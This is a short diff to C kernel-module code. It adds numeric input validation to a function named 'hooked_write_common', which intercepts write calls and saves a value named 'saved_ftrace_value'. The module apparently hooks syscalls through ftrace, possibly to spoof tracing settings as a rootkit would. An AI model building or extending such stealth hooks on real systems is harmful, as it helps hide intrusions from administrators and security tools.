@@ -152,6 +152,32 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
             return -EFAULT;
         }
         
+        bool valid = false;
+        
+        if (count >= 1) {
+            char temp_buf[32];
+            size_t parse_len = min(count, sizeof(temp_buf) - 1);
+            char *endptr;
+            
+            memcpy(temp_buf, kernel_buf, parse_len);
+            temp_buf[parse_len] = '\0';
+            
+            if ((temp_buf[0] >= '0' && temp_buf[0] <= '9') || 
+                temp_buf[0] == '-' || temp_buf[0] == '+') {
+                
+                simple_strtol(temp_buf, &endptr, 0);
+                
+                if (endptr != temp_buf) {
+                    valid = true;
+                }
+            }
+        }
+        
+        if (!valid) {
+            kfree(kernel_buf);
+            return -EINVAL;
+        }
+        
         size_t len = min(count, (size_t)(sizeof(saved_ftrace_value) - 1));
         memcpy(saved_ftrace_value, kernel_buf, len);
         saved_ftrace_value[len] = '\0';
